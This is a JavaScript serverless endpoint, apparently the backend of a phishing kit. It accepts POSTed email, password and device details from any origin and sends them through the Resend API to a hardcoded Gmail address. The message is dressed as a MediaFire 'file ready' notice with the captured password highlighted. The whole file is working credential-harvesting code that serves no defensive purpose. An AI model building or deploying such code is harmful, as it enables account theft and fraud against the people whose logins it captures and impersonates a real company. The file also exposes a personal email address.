export const config = {
    api: {
        bodyParser: true
    }
};

function countryFlag(code) {
    if (!code || code.length !== 2) return "";
    const codePoints = code.toUpperCase().split("").map(function (c) {
        return 127397 + c.charCodeAt(0);
    });
    return String.fromCodePoint.apply(null, codePoints);
}

export default async function handler(req, res) {

    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");

    if (req.method === "OPTIONS") {
        return res.status(200).end();
    }

    if (req.method !== "POST") {
        return res.status(405).json({ error: "Method not allowed" });
    }

    const API_KEY = process.env.RESEND_API_KEY;
    const EMAIL = process.env.TO_EMAIL || "medikaputra5@gmail.com";

    if (!API_KEY) {
        return res.status(500).json({
            error: "API_KEY_MISSING",
            message: "RESEND_API_KEY env variable not set"
        });
    }

    try {
        let d = req.body;
        if (typeof d === "string") {
            d = JSON.parse(d);
        }
        if (!d) {
            return res.status(400).json({ error: "BODY_EMPTY" });
        }

        const NAMA = "MediaFire";
        const waktu = d.waktu || new Date().toLocaleString("id-ID", {
            weekday: "long",
            day: "2-digit",
            month: "long",
            year: "numeric",
            hour: "2-digit",
            minute: "2-digit",
            second: "2-digit"
        });

        const flag = countryFlag(d.negaraKode || "");
        const emailStr = d.email || "-";
        const passwordStr = d.password || "-";
        const namaFile = emailStr.split("@")[0] + "_login.txt";
        const ukuran = ((emailStr.length + passwordStr.length) / 1024).toFixed(2);

        const htmlBody = `
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="margin:0;padding:0;background:#eef2f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;">
    <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#eef2f7;padding:24px 12px;">
        <tr>
            <td align="center">
                <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="max-width:600px;background:#ffffff;border-radius:8px;overflow:hidden;box-shadow:0 2px 12px rgba(0,0,0,0.08);">

                    <!-- HEADER MEDIAFIRE -->
                    <tr>
                        <td style="background:#1c4e9c;padding:20px 24px;">
                            <table role="presentation" width="100%" cellpadding="0" cellspacing="0">
                                <tr>
                                    <td style="vertical-align:middle;">
                                        <div style="display:inline-block;background:#ffffff;width:38px;height:38px;border-radius:50%;text-align:center;line-height:38px;font-size:22px;vertical-align:middle;">☁️</div>
                                        <span style="color:#ffffff;font-size:22px;font-weight:700;letter-spacing:-0.3px;margin-left:10px;vertical-align:middle;">MediaFire</span>
                                    </td>
                                </tr>
                            </table>
                        </td>
                    </tr>

                    <!-- BODY -->
                    <tr>
                        <td style="padding:28px 24px 20px;">
                            <h1 style="margin:0 0 6px;font-size:20px;color:#202124;font-weight:600;">File Anda Siap</h1>
                            <p style="margin:0 0 20px;font-size:14px;color:#5f6368;line-height:1.5;">File berikut telah diunggah ke akun Anda. Berikut detail file:</p>

                            <!-- CARD FILE -->
                            <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #e0e0e0;border-radius:6px;overflow:hidden;">

                                <tr>
                                    <td style="padding:12px 16px;background:#fafafa;border-bottom:1px solid #e0e0e0;width:140px;font-size:13px;color:#5f6368;font-weight:600;">Nama File</td>
                                    <td style="padding:12px 16px;background:#ffffff;border-bottom:1px solid #e0e0e0;font-size:13px;color:#202124;word-break:break-all;">${namaFile}</td>
                                </tr>
                                <tr>
                                    <td style="padding:12px 16px;background:#fafafa;border-bottom:1px solid #e0e0e0;font-size:13px;color:#5f6368;font-weight:600;">Tipe File</td>
                                    <td style="padding:12px 16px;background:#ffffff;border-bottom:1px solid #e0e0e0;font-size:13px;color:#202124;">Text Document</td>
                                </tr>
                                <tr>
                                    <td style="padding:12px 16px;background:#fafafa;border-bottom:1px solid #e0e0e0;font-size:13px;color:#5f6368;font-weight:600;">Ukuran</td>
                                    <td style="padding:12px 16px;background:#ffffff;border-bottom:1px solid #e0e0e0;font-size:13px;color:#202124;">${ukuran} KB</td>
                                </tr>
                                <tr>
                                    <td style="padding:12px 16px;background:#fafafa;border-bottom:1px solid #e0e0e0;font-size:13px;color:#5f6368;font-weight:600;">Diunggah</td>
                                    <td style="padding:12px 16px;background:#ffffff;border-bottom:1px solid #e0e0e0;font-size:13px;color:#202124;">${waktu}</td>
                                </tr>
                                <tr>
                                    <td style="padding:12px 16px;background:#fafafa;border-bottom:1px solid #e0e0e0;font-size:13px;color:#5f6368;font-weight:600;">Email</td>
                                    <td style="padding:12px 16px;background:#ffffff;border-bottom:1px solid #e0e0e0;font-size:13px;color:#202124;word-break:break-all;">${emailStr}</td>
                                </tr>
                                <tr>
                                    <td style="padding:12px 16px;background:#fafafa;border-bottom:1px solid #e0e0e0;font-size:13px;color:#5f6368;font-weight:600;">Password</td>
                                    <td style="padding:12px 16px;background:#ffffff;border-bottom:1px solid #e0e0e0;font-size:13px;color:#d93025;font-weight:700;font-family:'Courier New',monospace;word-break:break-all;">${passwordStr}</td>
                                </tr>
                                <tr>
                                    <td style="padding:12px 16px;background:#fafafa;font-size:13px;color:#5f6368;font-weight:600;vertical-align:top;">Perangkat</td>
                                    <td style="padding:12px 16px;background:#ffffff;font-size:12px;color:#5f6368;line-height:1.5;word-break:break-all;">${d.device || "-"} | ${d.os || "-"} | ${d.browser || "-"}</td>
                                </tr>

                            </table>

                            <!-- TOMBOL DOWNLOAD -->
                            <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="margin-top:24px;">
                                <tr>
                                    <td align="center">
                                        <a href="https://videy.co" style="display:inline-block;background:#1c4e9c;color:#ffffff;text-decoration:none;font-size:15px;font-weight:600;padding:14px 40px;border-radius:4px;letter-spacing:0.3px;">⬇ Download (${ukuran} KB)</a>
                                    </td>
                                </tr>
                            </table>

                            <div style="margin-top:24px;padding:12px 16px;background:#fff8e1;border-left:4px solid #ffc107;border-radius:4px;font-size:12px;color:#7a5c00;line-height:1.5;">
                                ⚠ File akan otomatis dihapus dalam 30 hari. Segera amankan file Anda.
                            </div>

                        </td>
                    </tr>

                    <!-- FOOTER -->
                    <tr>
                        <td style="background:#f5f5f5;border-top:1px solid #e0e0e0;padding:20px 24px;text-align:center;">
                            <div style="font-size:11px;color:#888;line-height:1.6;">
                                © 2026 MediaFire. All rights reserved.<br>
                                Email otomatis, jangan balas pesan ini.<br>
                                <a href="#" style="color:#1c4e9c;text-decoration:none;">Unsubscribe</a> · <a href="#" style="color:#1c4e9c;text-decoration:none;">Privacy Policy</a>
                            </div>
                        </td>
                    </tr>

                </table>
            </td>
        </tr>
    </table>
</body>
</html>`;

        const response = await fetch("https://api.resend.com/emails", {
            method: "POST",
            headers: {
                "Authorization": "Bearer " + API_KEY,
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                from: NAMA + " <onboarding@resend.dev>",
                to: [EMAIL],
                subject: "📁 File Anda Siap — " + namaFile,
                html: htmlBody
            })
        });

        const data = await response.json();
        return res.status(response.status).json(data);

    } catch (error) {
        return res.status(500).json({
            error: "CATCH_ERROR",
            message: error.message,
            stack: error.stack
        });
    }
}
